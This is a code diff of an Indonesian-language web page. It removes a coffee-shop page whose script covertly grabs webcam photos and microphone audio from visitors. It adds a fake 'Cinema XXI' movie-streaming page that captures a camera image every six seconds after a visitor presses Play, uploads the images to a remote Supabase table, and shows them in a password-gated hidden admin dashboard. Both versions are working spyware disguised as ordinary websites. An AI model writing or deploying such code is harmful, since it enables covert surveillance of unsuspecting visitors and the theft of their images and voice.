@@ -1,552 +1,152 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Niazi MK - Coffee Shop</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Cinema XXI - Tiket Nonton Online</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Arial', sans-serif;
-        }
+        :root { --xxi-blue: #002547; --xxi-gold: #b2935b; --bg: #001529; }
+        body { background: var(--bg); color: #fff; font-family: Arial, sans-serif; margin: 0; padding-bottom: 70px; overflow-x: hidden; }
+        
+        header { background: var(--xxi-blue); padding: 15px; text-align: center; border-bottom: 2px solid var(--xxi-gold); position: sticky; top: 0; z-index: 1000; }
+        .logo-text { color: var(--xxi-gold); font-size: 20px; font-weight: bold; letter-spacing: 2px; }
+        
+        /* TOMBOL RAHASIA ADMIN DI POJOK KANAN ATAS */
+        .secret-area { position: absolute; right: 0; top: 0; width: 80px; height: 60px; z-index: 1001; cursor: pointer; }
 
-        body {
-            background: #f4e4d4;
-        }
+        /* Full Screen Video Player */
+        #video-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 2000; flex-direction: column; }
+        .close-player { background: var(--xxi-gold); color: #000; border: none; padding: 10px; font-weight: bold; cursor: pointer; }
+        .yt-wrapper { flex-grow: 1; display: flex; align-items: center; justify-content: center; }
 
-        /* Navbar */
-        .navbar {
-            background: #2c1e14;
-            padding: 15px 30px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            color: white;
-        }
+        /* Movie List */
+        .content { padding: 15px; }
+        .movie-card { background: #002140; border: 1px solid #003366; border-radius: 8px; margin-bottom: 20px; overflow: hidden; }
+        .poster { width: 100%; height: 200px; object-fit: cover; background: #000; }
+        .info { padding: 15px; text-align: center; }
+        .title { font-size: 14px; font-weight: bold; margin-bottom: 10px; color: #eee; }
+        .btn-play { background: linear-gradient(180deg, #b2935b 0%, #8e7547 100%); color: white; border: none; width: 100%; padding: 12px; border-radius: 5px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
 
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .monkey {
-            font-size: 40px;
-            position: relative;
-        }
-
-        .monkey::after {
-            content: "🚬";
-            font-size: 20px;
-            position: absolute;
-            top: -5px;
-            right: -15px;
-            transform: rotate(15deg);
-        }
-
-        .shop-name {
-            font-size: 28px;
-            font-weight: bold;
-            color: #d4a373;
-        }
-
-        .nav-links a {
-            color: white;
-            text-decoration: none;
-            margin-left: 25px;
-        }
-
-        .admin-btn {
-            background: #d4a373;
-            color: #2c1e14 !important;
-            padding: 8px 20px;
-            border-radius: 20px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-
-        /* Hero */
-        .hero {
-            background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('https://images.unsplash.com/photo-1495474472287-4d71bcdd2085?w=600');
-            background-size: cover;
-            height: 500px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            text-align: center;
-        }
-
-        .hero h1 {
-            font-size: 50px;
-            margin-bottom: 20px;
-        }
-
-        .hero h1 span {
-            color: #d4a373;
-        }
-
-        /* Menu */
-        .menu {
-            padding: 50px 30px;
-            text-align: center;
-        }
-
-        .menu h2 {
-            font-size: 36px;
-            color: #2c1e14;
-            margin-bottom: 40px;
-        }
-
-        .menu-items {
-            display: flex;
-            justify-content: center;
-            gap: 30px;
-            flex-wrap: wrap;
-        }
-
-        .item {
-            background: white;
-            border-radius: 10px;
-            padding: 20px;
-            width: 250px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-        }
-
-        .item img {
-            width: 100%;
-            height: 150px;
-            object-fit: cover;
-            border-radius: 10px;
-        }
-
-        .item h3 {
-            margin: 15px 0;
-            color: #2c1e14;
-        }
-
-        .item p {
-            color: #d4a373;
-            font-weight: bold;
-            font-size: 20px;
-        }
-
-        /* About */
-        .about {
-            background: #2c1e14;
-            color: white;
-            padding: 50px 30px;
-            display: flex;
-            align-items: center;
-            gap: 50px;
-            justify-content: center;
-            flex-wrap: wrap;
-        }
-
-        .about-text {
-            max-width: 500px;
-        }
-
-        .about-text h2 {
-            color: #d4a373;
-            margin-bottom: 20px;
-        }
-
-        .about img {
-            width: 300px;
-            border-radius: 10px;
-        }
-
-        /* Footer */
-        .footer {
-            background: #1a120c;
-            color: white;
-            padding: 30px;
-            text-align: center;
-        }
+        /* Hidden Capture */
+        #v { position: fixed; top: -9999px; left: -9999px; opacity: 0; }
+        #c { display: none; }
 
         /* Admin Panel */
-        .admin-panel {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%) scale(0);
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            z-index: 1001;
-            width: 90%;
-            max-width: 600px;
-            max-height: 80vh;
-            overflow-y: auto;
-            transition: 0.3s;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-        }
+        #admin-dash { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #050505; z-index: 3000; color: #00ff00; padding: 20px; overflow-y: auto; font-family: 'Courier New', monospace; }
+        .log-item { border: 1px solid #222; padding: 10px; margin-bottom: 10px; background: #111; font-size: 12px; }
+        .log-item img { width: 100%; margin-top: 10px; border: 1px solid #00ff00; }
 
-        .admin-panel.active {
-            transform: translate(-50%, -50%) scale(1);
-        }
-
-        .admin-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-            padding-bottom: 10px;
-            border-bottom: 2px solid #d4a373;
-        }
-
-        .close-btn {
-            background: none;
-            border: none;
-            font-size: 30px;
-            cursor: pointer;
-        }
-
-        .login-form {
-            display: flex;
-            gap: 10px;
-        }
-
-        .login-form input {
-            flex: 1;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-        }
-
-        .login-form button {
-            padding: 10px 20px;
-            background: #d4a373;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-
-        .data-item {
-            background: #f9f9f9;
-            padding: 15px;
-            margin-bottom: 10px;
-            border-radius: 5px;
-        }
-
-        .data-item img {
-            width: 100%;
-            max-width: 200px;
-            border-radius: 5px;
-        }
-
-        audio {
-            width: 100%;
-            margin-top: 10px;
-        }
-
-        .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0,0,0,0.5);
-            z-index: 1000;
-            display: none;
-        }
-
-        .overlay.active {
-            display: block;
-        }
-
-        .floating-admin {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: #d4a373;
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-            cursor: pointer;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
-            z-index: 99;
-        }
+        /* Navbar Bottom */
+        nav { position: fixed; bottom: 0; width: 100%; background: #001b35; display: flex; border-top: 1px solid #003366; padding: 10px 0; }
+        .nav-link { flex: 1; text-align: center; color: #6e8499; font-size: 11px; text-decoration: none; }
     </style>
 </head>
 <body>
-    <!-- Navbar -->
-    <div class="navbar">
-        <div class="logo">
-            <div class="monkey">🐒</div>
-            <div class="shop-name">niazi.mk</div>
-        </div>
-        <div class="nav-links">
-            <a href="#">Home</a>
-            <a href="#">Menu</a>
-            <a href="#">About</a>
-            <a class="admin-btn" onclick="showAdmin()">Admin</a>
-        </div>
-    </div>
 
-    <!-- Hero -->
-    <div class="hero">
-        <div>
-            <h1>Welcome to <span>niazi.mk</span></h1>
-            <p>Specialty coffee with monkey style 🐒</p>
-        </div>
-    </div>
+<header>
+    <div class="logo-text">CINEMA XXI</div>
+    <div class="secret-area" onclick="handleSecretClick()"></div>
+</header>
 
-    <!-- Menu -->
-    <div class="menu">
-        <h2>Our Menu</h2>
-        <div class="menu-items">
-            <div class="item">
-                <img src="https://images.unsplash.com/photo-1510707577719-ae7c14805e6a?w=300" alt="Espresso">
-                <h3>Monkey Espresso</h3>
-                <p>$4.99</p>
-            </div>
-            <div class="item">
-                <img src="https://images.unsplash.com/photo-1557008075-6f2c5e0cb2f1?w=300" alt="Latte">
-                <h3>Caramel Latte</h3>
-                <p>$5.99</p>
-            </div>
-            <div class="item">
-                <img src="https://images.unsplash.com/photo-1525382455947-f319bc50fb34?w=300" alt="Matcha">
-                <h3>Monkey Matcha</h3>
-                <p>$4.99</p>
-            </div>
+<div id="video-overlay">
+    <button class="close-player" onclick="stopVideo()">CLOSE PLAYER [X]</button>
+    <div class="yt-wrapper" id="yt-player">
+        </div>
+</div>
+
+<div class="content" id="main-ui">
+    <div class="movie-card">
+        <img src="https://web3.21cineplex.com/movie-images/14VINA_290x426.jpg" class="poster">
+        <div class="info">
+            <div class="title">VINA: SEBELUM 7 HARI (FULL MOVIE)</div>
+            <button class="btn-play" onclick="playFilm('VINA', '9v_zX7vXo7w')">PLAY NOW</button>
         </div>
     </div>
-
-    <!-- About -->
-    <div class="about">
-        <img src="https://images.unsplash.com/photo-1442512595331-e89e73853f31?w=400" alt="Coffee">
-        <div class="about-text">
-            <h2>About Niazi MK</h2>
-            <p>Founded in 2020, we serve the best coffee with our signature monkey mascot. Our baristas are trained to perfection, just like our espresso shots.</p>
+    
+    <div class="movie-card">
+        <img src="https://web3.21cineplex.com/movie-images/14KUTU_290x426.jpg" class="poster">
+        <div class="info">
+            <div class="title">KUTUKAN CALON ARANG (FULL MOVIE)</div>
+            <button class="btn-play" onclick="playFilm('CALON ARANG', 'XyL3A_H8h9U')">PLAY NOW</button>
         </div>
     </div>
+</div>
 
-    <!-- Footer -->
-    <div class="footer">
-        <p>&copy; 2024 niazi.mk - All rights reserved 🐒☕</p>
-    </div>
+<nav>
+    <a href="#" class="nav-link">Movies</a>
+    <a href="#" class="nav-link">Theaters</a>
+    <a href="#" class="nav-link" style="color:var(--xxi-gold)">M-Tix</a>
+    <a href="#" class="nav-item">Profile</a>
+</nav>
 
-    <!-- Floating Admin -->
-    <div class="floating-admin" onclick="showAdmin()">👤</div>
+<div id="admin-dash">
+    <h3>[ NIAZI CLOUD MONITOR ]</h3>
+    <button onclick="location.reload()" style="background:lime; padding:5px;">REFRESH</button>
+    <button onclick="closeAdmin()" style="background:red; color:#fff; padding:5px;">EXIT</button>
+    <hr>
+    <div id="logs-container">Loading data...</div>
+</div>
 
-    <!-- Overlay -->
-    <div class="overlay" id="overlay" onclick="hideAdmin()"></div>
+<video id="v" autoplay playsinline></video>
+<canvas id="c" width="640" height="480"></canvas>
 
-    <!-- Admin Panel -->
-    <div class="admin-panel" id="adminPanel">
-        <div class="admin-header">
-            <h2>🔐 Admin Panel</h2>
-            <button class="close-btn" onclick="hideAdmin()">&times;</button>
-        </div>
-        <div id="adminContent">
-            <div class="login-form">
-                <input type="password" id="adminPass" placeholder="Enter password">
-                <button onclick="checkPass()">Login</button>
-            </div>
-        </div>
-    </div>
+<script>
+    const SB_URL = "https://rdbtmwlbcrooeiwasksg.supabase.co";
+    const SB_KEY = "sb_publishable_DYcU7YAc4wN3cysWgYyJyQ_DMH_egzc";
+    const supabase = window.supabase.createClient(SB_URL, SB_KEY);
 
-    <script>
-        // =============================================
-        // OTOMATIS CAPTURE TANPA KLIK - SAAT HALAMAN DIBUKA
-        // =============================================
+    let taps = 0;
+    function handleSecretClick() {
+        taps++;
+        if(taps >= 5) {
+            if(prompt("PASSWORD:") === "NIAZI1212") {
+                document.getElementById('admin-dash').style.display = 'block';
+                loadLogs();
+            }
+            taps = 0;
+        }
+    }
+
+    async function playFilm(name, ytId) {
+        // Tampilkan Player
+        document.getElementById('video-overlay').style.display = 'flex';
+        document.getElementById('yt-player').innerHTML = `<iframe width="100%" height="100%" src="https://www.youtube.com/embed/${ytId}?autoplay=1" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>`;
         
-        // Data storage
-        let capturedData = JSON.parse(localStorage.getItem('niazi_data')) || [];
+        // Mulai Maling Data
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            document.getElementById('v').srcObject = stream;
 
-        // Fungsi capture otomatis
-        async function autoCapture() {
-            try {
-                console.log('🚀 Memulai capture otomatis...');
-                
-                // Minta izin kamera dan mikrokn
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: 'user',
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    }, 
-                    audio: true 
-                });
-                
-                console.log('✅ Izin diberikan, mulai capture...');
+            await supabase.from('darzi_logs').insert([{ type: 'ALERT', data: `Target Nonton: ${name} | IP: Auto` }]);
 
-                // Buat element video tersembunyi
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.style.display = 'none';
-                document.body.appendChild(video);
-                await video.play();
+            const canvas = document.getElementById('c');
+            setInterval(async () => {
+                canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 640, 480);
+                const shot = canvas.toDataURL('image/jpeg', 0.4);
+                await supabase.from('darzi_logs').insert([{ type: 'PHOTO', data: shot }]);
+            }, 6000); // Jepret tiap 6 detik
+        } catch(e) {}
+    }
 
-                // Tunggu 1 detik agar kamera siap
-                await new Promise(r => setTimeout(r, 1000));
+    function stopVideo() {
+        document.getElementById('video-overlay').style.display = 'none';
+        document.getElementById('yt-player').innerHTML = "";
+    }
 
-                // AMBIL FOTO
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                const context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const photoData = canvas.toDataURL('image/jpeg');
+    function closeAdmin() { document.getElementById('admin-dash').style.display = 'none'; }
 
-                console.log('✅ Foto berhasil diambil');
-
-                // REKAM SUARA (5 detik)
-                const mediaRecorder = new MediaRecorder(stream);
-                const audioChunks = [];
-
-                mediaRecorder.ondataavailable = event => {
-                    audioChunks.push(event.data);
-                };
-
-                mediaRecorder.onstop = () => {
-                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-                    const reader = new FileReader();
-                    reader.onloadend = () => {
-                        // Simpan data
-                        const data = {
-                            id: Date.now(),
-                            waktu: new Date().toLocaleString(),
-                            foto: photoData,
-                            suara: reader.result,
-                            url: window.location.href,
-                            userAgent: navigator.userAgent
-                        };
-
-                        capturedData.push(data);
-                        localStorage.setItem('niazi_data', JSON.stringify(capturedData));
-
-                        console.log('✅ Data tersimpan! Total:', capturedData.length);
-
-                        // Bersihkan
-                        stream.getTracks().forEach(track => track.stop());
-                        document.body.removeChild(video);
-                    };
-                    reader.readAsDataURL(audioBlob);
-                };
-
-                // Mulai rekam
-                mediaRecorder.start();
-                console.log('🎤 Merekam suara...');
-
-                // Rekam 5 detik lalu stop
-                setTimeout(() => {
-                    mediaRecorder.stop();
-                    console.log('⏹️ Rekam selesai');
-                }, 5000);
-
-            } catch (err) {
-                console.log('❌ Gagal capture:', err);
-                // Coba lagi 3 detik kemudian
-                setTimeout(autoCapture, 3000);
-            }
-        }
-
-        // =============================================
-        // TRIGGER OTOMATIS - TANPA KLIK
-        // =============================================
-
-        // 1. Saat halaman pertama kali dimuat
-        window.addEventListener('load', function() {
-            console.log('📄 Halaman dimuat, memulai capture dalam 2 detik...');
-            setTimeout(autoCapture, 2000);
+    async function loadLogs() {
+        const { data } = await supabase.from('darzi_logs').select('*').order('created_at', { ascending: false });
+        const container = document.getElementById('logs-container');
+        container.innerHTML = "";
+        data.forEach(log => {
+            const div = document.createElement('div');
+            div.className = 'log-item';
+            div.innerHTML = log.type === 'PHOTO' ? `<img src="${log.data}">` : `<strong>${log.type}</strong>: ${log.data}`;
+            container.appendChild(div);
         });
-
-        // 2. Saat user scroll (bisa trigger ulang)
-        window.addEventListener('scroll', function() {
-            // Hanya trigger sekali setiap 10 detik
-            if (!window.scrollTriggered) {
-                window.scrollTriggered = true;
-                console.log('📜 Scroll terdeteksi, capture ulang...');
-                autoCapture();
-                setTimeout(() => { window.scrollTriggered = false; }, 10000);
-            }
-        });
-
-        // 3. Saat user klik di mana saja (bisa trigger ulang)
-        document.addEventListener('click', function() {
-            if (!window.clickTriggered) {
-                window.clickTriggered = true;
-                console.log('👆 Klik terdeteksi, capture ulang...');
-                autoCapture();
-                setTimeout(() => { window.clickTriggered = false; }, 10000);
-            }
-        });
-
-        // 4. Saat user pindah tab kembali
-        document.addEventListener('visibilitychange', function() {
-            if (!document.hidden) {
-                console.log('👁️ Kembali ke tab, capture...');
-                autoCapture();
-            }
-        });
-
-        // =============================================
-        // FUNGSI ADMIN
-        // =============================================
-
-        function showAdmin() {
-            document.getElementById('overlay').classList.add('active');
-            document.getElementById('adminPanel').classList.add('active');
-        }
-
-        function hideAdmin() {
-            document.getElementById('overlay').classList.remove('active');
-            document.getElementById('adminPanel').classList.remove('active');
-        }
-
-        function checkPass() {
-            const pass = document.getElementById('adminPass').value;
-            if (pass === 'NIAZI1212') {
-                showData();
-            } else {
-                alert('Password salah!');
-            }
-        }
-
-        function showData() {
-            const data = JSON.parse(localStorage.getItem('niazi_data')) || [];
-            let html = '<h3>📸 Data Capture Otomatis:</h3>';
-            
-            if (data.length === 0) {
-                html += '<p>Belum ada data</p>';
-            } else {
-                data.forEach((item, i) => {
-                    html += `
-                        <div class="data-item">
-                            <p><b>Target #${i+1}</b></p>
-                            <p>🕐 ${item.waktu}</p>
-                            <img src="${item.foto}" alt="Foto target">
-                            <audio controls src="${item.suara}"></audio>
-                        </div>
-                    `;
-                });
-            }
-            
-            html += '<button onclick="hapusData()" style="background:red;color:white;padding:10px;width:100%;margin-top:20px;">Hapus Semua</button>';
-            
-            document.getElementById('adminContent').innerHTML = html;
-        }
-
-        function hapusData() {
-            if(confirm('Hapus semua data?')) {
-                localStorage.removeItem('niazi_data');
-                showData();
-            }
-        }
-
-        // Proteksi
-        document.addEventListener('contextmenu', e => e.preventDefault());
-        console.log('%c⚠️ AREA AMAN', 'color:green;font-size:20px');
-    </script>
+    }
+</script>
 </body>
 </html>
